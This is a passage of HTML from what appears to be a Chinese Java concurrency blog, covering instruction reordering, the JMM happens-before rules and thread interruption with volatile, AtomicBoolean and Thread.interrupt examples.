class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">mySort</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">11</span>; <span class="comment">//语句1</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> <span class="number">12</span>; <span class="comment">//语句2</span></span><br><span class="line">    x = x + <span class="number">5</span>;  <span class="comment">//语句3</span></span><br><span class="line">    y = x * x;  <span class="comment">//语句4</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">  <span class="number">1234</span></span><br><span class="line">  <span class="number">2134</span></span><br><span class="line">  <span class="number">1324</span></span><br><span class="line"> </span><br><span class="line">问题：请问语句<span class="number">4</span>可以重排后变成第一条吗？</span><br></pre></td></tr></table></figure><p>对于一个线程的执行代码而言，我们总是习惯性认为代码的执行总是从上到下，有序执行。但为了提供性能，编译器和处理器通常会对指令序列进行<strong>重新排序</strong>。Java规范规定JVM线程内部维持顺序化语义，即只要程序的最终结果与它顺序化执行的结果相等，那么指令的执行顺序可以与代码顺序不一致，此过程叫指令的重排序。</p><p>优缺点：</p><ul><li>JVM能根据处理器特性（CPU多级缓存系统、多核处理器等）适当的机器对指令进行重排序，使得机器指令能更符合CPU的执行特性，最大限度的发挥机器性能。</li><li>但是，指令重排可以<strong>保证串行语义一致</strong>，但没有义务保证多线程间的语义也一致（即可能产生“<strong>脏读</strong>”），简单说，两行以上不相干的代码在执行的时候有可能先执行的不是第一条，不见得是从上到下顺序执行，执行顺序会被优化。</li></ul><p>指令重排的<strong>三种表现（层面）</strong>：</p><ul><li>编译器优化的重排</li><li>指令并行的重排</li><li>内存系统的重排</li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20221016233706.png"></p><p>小结：</p><ul><li><p>单线程环境里面确保程序最终执行结果和代码顺序执行的结果一致。</p></li><li><p>处理器在进行重排序时必须要考虑指令之间的<strong>数据依赖性</strong>。</p></li><li><p>多线程环境中线程交替执行，由于编译器优化重排的存在，两个线程中使用的变量能否保证一致性是<strong>无法确定</strong>的，结果无法预测</p></li></ul><h1 id="多线程对变量的读写过程"><a href="#多线程对变量的读写过程" class="headerlink" title="多线程对变量的读写过程"></a>多线程对变量的读写过程</h1><p>JMM规范下，多线程对变量的读写过程：</p><ul><li>由于JVM运行程序的实体是线程，而每个线程创建时JVM都会为其创建一个工作内存(有些地方称为栈空间)，工作内存是每个线程的私有数据区域。而Java内存模型中规定所有变量都存储在主内存，主内存是共享内存区域，所有线程都可以访问。</li><li>但线程对变量的操作(读取赋值等)必须在工作内存中进行，<strong>首先要将变量从主内存拷贝到的线程自己的工作内存空间，然后对变量进行操作，操作完成后再将变量写回主内存</strong>，不能直接操作主内存中的变量，各个线程中的工作内存中存储着主内存中的<strong>变量副本拷贝</strong>，因此<strong>不同的线程间无法访问对方的工作内存</strong>，线程间的通信(传值)必须通过主内存来完成，其简要访问过程如下图:</li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20221016234822.png"></p><p>JMM定义了线程和主内存之间的抽象关系：</p><ol><li>线程之间的共享变量存储在主内存中(从硬件角度来说就是内存条)</li><li>每个线程都有一个私有的本地工作内存，本地工作内存中存储了该线程用来读&#x2F;写共享变量的副本(从硬件角度来说就是CPU的缓存，比如寄存器、L1、L2、L3缓存等)</li></ol><p>小总结：</p><ol><li>我们定义的所有共享变量都储存在物理主内存中。</li><li>每个线程都有自己独立的工作内存，里面保存该线程使用到的变量的副本(主内存中该变量的一份拷贝)。</li><li>线程对共享变量所有的操作都必须先在线程自己的工作内存中进行后写回主内存，不能直接从主内存中读写(不能越级)。</li><li>不同线程之间也无法直接访问其他线程的工作内存中的变量，线程间变量值的传递需要通过主内存来进行(同级不能相互访问)。</li></ol><h1 id="多线程先行发生原则之happens-before"><a href="#多线程先行发生原则之happens-before" class="headerlink" title="多线程先行发生原则之happens-before"></a>多线程先行发生原则之happens-before</h1><p>JMM规范下，多线程先行发生原则之happens-before：</p><blockquote><p>在JMM中，如果一个操作执行的结果需要对另一个操作可见性或者代码重排序，那么这两个操作之间必须存在happens-before（先行发生）原则。逻辑上的<strong>先后关系</strong>。</p></blockquote><p>x，y案例说明：</p><ul><li>x &#x3D; 5线程A执行</li><li>y &#x3D; x线程B执行<br>上述称之为：写后读</li></ul><p></p><p> 问题：y是否等于5呢？</p><ul><li>如果线程A的操作（x&#x3D; 5）happens-before(先行发生)线程B的操作（y &#x3D; x），那么可以确定线程B执行后y &#x3D; 5 一定成立（写后读）；</li><li>如果他们不存在happens-before原则，那么y &#x3D; 5 不一定成立。这就是happens-before原则的威力，包含可见性和有序性的约束。</li></ul><h2 id="先行发生原则说明"><a href="#先行发生原则说明" class="headerlink" title="先行发生原则说明"></a>先行发生原则说明</h2><p>如果Java内存模型中所有的有序性都仅靠<code>volatile</code>和<code>synchronized</code>来完成，那么有很多操作都将会变得非常啰嗦，但是我们在编写Java并发代码的时候并没有察觉到这一点。我们没有时时、处处、次次，添加volatile和synchronized来完成程序。</p><p>这是因为Java语言中JMM原则下有一个<strong>“先行发生”(Happens-Before)的原则</strong>限制和规矩。</p><p>这个原则非常重要： 它是判断数据是否存在竞争，线程是否安全的非常有用的手段。依赖这个原则，我们可以通过几条简单规则一揽子解决<strong>并发环境下两个操作之间是否可能存在冲突的所有问题</strong>，而不需要陷入Java内存模型苦涩难懂的底层编译原理之中。</p><h2 id="happens-before总原则"><a href="#happens-before总原则" class="headerlink" title="happens-before总原则"></a>happens-before总原则</h2><ul><li>如果一个操作happens-before另一个操作，那么第一个操作的执行结果将对第二个操作可见，而且第一个操作的执行顺序排在第二个操作之前。</li><li>两个操作之间存在happens-before关系，并不意味着一定要按照happens-before原则制定的顺序来执行；<br>如果重排序之后的执行结果与按照happens-before关系来执行的结果一致，那么这种重排序并不非法。</li></ul><h2 id="happens-before之8条原则"><a href="#happens-before之8条原则" class="headerlink" title="happens-before之8条原则"></a>happens-before之8条原则</h2><ol><li><p>次序规则：<strong>一个线程内</strong>，按照代码顺序，写在前面的操作先行发生于写在后面的操作。</p></li><li><p>锁定规则：锁的获取的先后顺序。一个unLock操作先行发生于后面（这里的后面是指时间上的先后）对同一个锁的lock操作（一个线程想要lock，肯定要等前面的锁unLock释放这个资源）</p></li><li><p>volatile变量规则：对一个volatile变量的写操作先行发生于后面对这个变量的读操作，前面的写对后面的读是可见的，这里的后面同样是指时间上的先后。</p></li><li><p>传递规则：如果操作A先行发生于操作B，而操作B又先行发生于操作C，则可以得出操作A先行发生于操作C</p></li><li><p>线程启动规则(Thread Start Rule)：Thread对象的start()方法先行发生于此线程的每一个动作</p></li><li><p>线程中断规则(Thread Interruption Rule)：对线程interrupt()方法的调用先行发生于被中断线程的代码检测到中断事件的发生，可以通过Thread.interrupted()检测到是否发生中断。也就是说你要先调用了interrupt()方法设置过中断标志位，我才能检测到中断发送。</p></li><li><p>线程终止规则(Thread Termination Rule)：线程中的所有操作都先行发生于对此线程的终止检测，我们可以通过isAlive()等手段检测线程是否已经终止执行。</p></li><li><p>对象终结规则(Finalizer Rule)：一个对象的初始化完成（构造函数执行结束）先行发生于它的finalize()方法的开始。finalize()方法通常是在对象被不可撤销的丢弃之前执行清理操作。</p></li></ol><h2 id="案例说明"><a href="#案例说明" class="headerlink" title="案例说明"></a>案例说明</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDemo</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getValue</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> value; </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span>  <span class="type">int</span> <span class="title function_">setValue</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> ++value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题：假设存在线程A和B，线程A先（时间上的先后）调用了setValue(1)，然后线程B调用了同一个对象的getValue()，那么线程B收到的返回值是什么？</p><p>我们就这段代码分析一下happens-before的规则（规则5、6、7、8 可以忽略，因为他们和这段代码毫无关系）：</p><ol><li>由于两个方法是由不同的线程调用，不在同一个线程中，所以肯定不满足程序次序规则；</li><li>两个方法都没有使用锁，所以不满足锁定规则；</li><li>变量不是用volatile修饰的，所以volatile变量规则不满足；</li><li>递规则肯定不满足；</li></ol><p>所以我们无法通过happens-before原则推导出线程A happens-before线程B，虽然可以确认在时间上线程A优先于线程B指定，但就是<strong>无法确认线程B获得的结果是什么</strong>，所以这段代码<strong>不是线程安全</strong>的。那么怎么修复这段代码呢？</p><ol><li>把getter&#x2F;setter方法都定义为synchronized方法</li><li>把value定义为volatile变量，由于setter方法对value的修改不依赖value的原值，满足volatile关键字使用场景</li></ol>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> JUC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JMM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LockSupport与线程中断</title>
      <link href="/posts/52039/"/>
      <url>/posts/52039/</url>
      
        <content type="html"><![CDATA[<h1 id="中断机制"><a href="#中断机制" class="headerlink" title="中断机制"></a>中断机制</h1><p>首先一个线程<strong>不应该由其他线程来强制中断或停止</strong>，而是应该由线程自己自行停止。所以<code>Thread.stop</code>，<code>Thread.suspend</code>， <code>Thread.resume</code> 都已经被废弃了。</p><p>其次在Java中没有办法立即停止一条线程，然而停止线程却显得尤为重要，如取消一个耗时操作。因此，Java提供了一种用于停止线程的机制——中断。中断只是一种<strong>协作机制</strong>，Java没有给中断增加任何语法，中断的过程完全需要程序员自己实现。</p><p>若要中断一个线程，你需要手动调用该线程的<code>interrupt</code>方法，该方法也<strong>仅仅是将线程对象的中断标识设成true</strong>；接着你需要自己写代码不断地检测当前线程的标识位，如果为true，表示别的线程要求这条线程中断，此时究竟该做什么需要你自己写代码实现。</p><ul><li>每个线程对象中都有一个标识，用于表示线程是否被中断：该标识位为true表示中断，为false表示未中断；</li><li>通过调用线程对象的interrupt方法将该线程的标识位设为true；可以在别的线程中调用，也可以在自己的线程中调用。</li></ul><h1 id="中断相关的API方法"><a href="#中断相关的API方法" class="headerlink" title="中断相关的API方法"></a>中断相关的API方法</h1><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>public void interrupt()</td><td>实例方法，实例方法interrupt()仅仅是设置线程的中断状态为true，发起一个协商而不会立刻停止线程</td></tr><tr><td>public static boolean interrupted()</td><td>静态方法，<code>Thread.interrupted();</code>判断线程是否被中断，并清除当前中断状态这个方法做了<strong>两件事</strong>：1. 返回当前线程的中断状态  2. 将当前线程的中断状态设为false</td></tr><tr><td>public boolean isInterrupted()</td><td>实例方法，判断当前线程是否被中断（通过检查中断标志位）</td></tr></tbody></table><h1 id="如何使用中断标识停止线程"><a href="#如何使用中断标识停止线程" class="headerlink" title="如何使用中断标识停止线程"></a>如何使用中断标识停止线程</h1><p>在需要中断的线程中不断监听中断状态，一旦发生中断，就执行相应的中断处理业务逻辑。</p><h2 id="通过volatile变量实现"><a href="#通过volatile变量实现" class="headerlink" title="通过volatile变量实现"></a>通过volatile变量实现</h2><p>volatile保证了可见性，t2修改了标志位后能马上被t1看到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="type">boolean</span> <span class="variable">isStop</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (isStop) &#123;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">&quot;线程------isStop被修改为true，程序终止&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(<span class="string">&quot;-------hello interrupt&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;t1&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//暂停几秒钟线程</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            isStop = <span class="literal">true</span>;</span><br><span class="line">        &#125;, <span class="string">&quot;t2&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="通过AtomicBoolean变量实现"><a href="#通过AtomicBoolean变量实现" class="headerlink" title="通过AtomicBoolean变量实现"></a>通过AtomicBoolean变量实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">AtomicBoolean</span> <span class="variable">atomicBoolean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicBoolean</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">while</span> (atomicBoolean.get()) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    TimeUnit.MILLISECONDS.sleep(<span class="number">500</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(<span class="string">&quot;t1 ------hello interrupt &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;t1&quot;</span>);</span><br><span class="line">        t1.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">3</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        atomicBoolean.set(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="通过Thread类自带的中断API方法实现"><a href="#通过Thread类自带的中断API方法实现" class="headerlink" title="通过Thread类自带的中断API方法实现"></a>通过Thread类自带的中断API方法实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (Thread.currentThread().isInterrupted()) &#123;<span class="comment">//一旦发现中断标志位被修改</span></span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t isInterrupted()被修改为true，程序终止&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(<span class="string">&quot;t1 ------hello interrupt &quot;</span>);<span class="comment">//----------------------如果没停止，那就一直打印</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;t1&quot;</span>);</span><br><span class="line">        t1.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.MILLISECONDS.sleep(<span class="number">20</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            t1.interrupt();<span class="comment">//把t1中断</span></span><br><span class="line">        &#125;, <span class="string">&quot;t2&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="中断协商案例深度解析"><a href="#中断协商案例深度解析" class="headerlink" title="中断协商案例深度解析"></a>中断协商案例深度解析</h1><p>当对一个线程，调用 interrupt() 时：</p><ul><li><p>如果线程处于正常活动状态，那么会将该线程的中断标志设置为 true，仅此而已。被设置中断标志的线程将继续<strong>正常运行</strong>，<strong>不受影响</strong>。所以， interrupt() 并不能真正地中断线程，需要被调用的线程自己进行配合才行。</p></li><li><p>如果线程处于被阻塞状态（例如处于sleep, wait, join 等状态），在别的线程中调用当前线程对象的interrupt方法，那么线程将立即退出被阻塞状态，并抛出一个InterruptedException异常。</p></li><li><p>中断不活动的线程不会产生任何影响</p></li></ul><hr><p>当线程的中断标识为true，线程不会立刻停止（一直输出i到300）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">300</span>; i++) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;-------&quot;</span> + i);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;after t1.interrupt()--第2次---: &quot;</span> + Thread.currentThread().isInterrupted());</span><br><span class="line">        &#125;, <span class="string">&quot;t1&quot;</span>);</span><br><span class="line">        t1.start();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;before t1.interrupt()----: &quot;</span> + t1.isInterrupted());</span><br><span class="line">        <span class="comment">//实例方法interrupt()仅仅是设置线程的中断状态位设置为true，不会停止线程</span></span><br><span class="line">        t1.interrupt();</span><br><span class="line">        <span class="comment">//活动状态,t1线程还在执行中</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.MILLISECONDS.sleep(<span class="number">3</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;after t1.interrupt()--第1次---: &quot;</span> + t1.isInterrupted());</span><br><span class="line">        <span class="comment">//非活动状态,t1线程不在执行中，已经结束执行了。</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.MILLISECONDS.sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;after t1.interrupt()--第3次---: &quot;</span> + t1.isInterrupted());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p>before t1.interrupt()—-: false<br>after t1.interrupt()–第1次—: true<br>after t1.interrupt()–第2次—: true<br>after t1.interrupt()–第3次—: false （这里false的原因应该是线程已经terminated标志位被重置了）</p><hr><p>如果线程处于被阻塞状态（例如处于sleep, wait, join 等状态），在别的线程中调用当前线程对象的<code>interrupt</code>方法，那么线程将<strong>立即退出被阻塞状态</strong>（<strong>中断状态将被清除</strong>），并抛出一个InterruptedException异常。</p><p>sleep方法抛出InterruptedException后，中断标识也被清空置为false，我们在catch没有通过thread.interrupt()方法再次将中断标志设置为true，这就导致无限循环了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (Thread.currentThread().isInterrupted()) &#123;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;中断标志位：&quot;</span> + Thread.currentThread().isInterrupted() + <span class="string">&quot;程序终止&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">200</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    <span class="comment">//Thread.currentThread().interrupt();  //假如加了这个，程序可以终止，只会抛异常</span></span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(<span class="string">&quot;-----hello InterruptDemo03&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;t1&quot;</span>);</span><br><span class="line">        t1.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.MILLISECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(t1::interrupt).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="静态方法Thread-interrupted"><a href="#静态方法Thread-interrupted" class="headerlink" title="静态方法Thread.interrupted()"></a>静态方法Thread.interrupted()</h1><p>静态方法，<code>Thread.interrupted();</code>判断线程是否被中断，并清除当前中断状态这个方法做了<strong>两件事</strong>：1. 返回当前线程的中断状态  2. 将当前线程的中断状态设为false</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;---&quot;</span> + Thread.interrupted());</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;---&quot;</span> + Thread.interrupted());</span><br><span class="line">        System.out.println(<span class="string">&quot;111111&quot;</span>);</span><br><span class="line">        Thread.currentThread().interrupt();</span><br><span class="line">        System.out.println(<span class="string">&quot;222222&quot;</span>);</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;---&quot;</span> + Thread.interrupted());</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;---&quot;</span> + Thread.interrupted());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p>main—false<br>main—false<br>111111<br>222222<br>main—true<br>main—false</p><hr><p><code>interrupted()</code>对比<code>isInterrupted()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">interrupted</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> currentThread().isInterrupted(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isInterrupted</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> isInterrupted(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Tests if some Thread has been interrupted.  The interrupted state</span></span><br><span class="line"><span class="comment"> * is reset or not based on the value of ClearInterrupted that is</span></span><br><span class="line"><span class="comment"> * passed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span 